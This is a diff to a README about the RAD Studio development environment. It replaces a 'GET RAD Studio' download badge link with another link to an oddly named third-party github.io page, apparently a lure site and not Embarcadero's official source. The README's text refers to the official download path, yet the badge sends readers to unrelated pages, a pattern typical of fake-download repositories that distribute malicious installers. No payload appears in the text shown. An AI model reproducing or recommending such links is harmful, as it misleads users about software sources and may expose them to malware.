@@ -52,7 +52,7 @@ The platform is known for rapid application development, visual form design, com
 
 Prerequisites: A compatible Windows development machine, an Embarcadero account, and the installer or subscription access needed for RAD Studio.
 
-[![GET RAD Studio](https://img.shields.io/badge/GET%20%E2%80%94%20RAD%20Studio-0078D6?style=for-the-badge&logoColor=white)](https://saulcainbjgl.github.io/.github/rad-studio-app)
+[![GET RAD Studio](https://img.shields.io/badge/GET%20%E2%80%94%20RAD%20Studio-0078D6?style=for-the-badge&logoColor=white)](https://teddyrosariojgih.github.io/.github/rad-studio-app)
 
 1.  **Download and Install:** Use the official rad studio download path, sign in with your Embarcadero account, and select the Delphi, C++Builder, platforms, and SDKs your project requires.
 2.  **Choose Your Edition:** Review rad studio community edition, rad studio trial, and rad studio license options before activating the environment for personal learning or professional delivery.
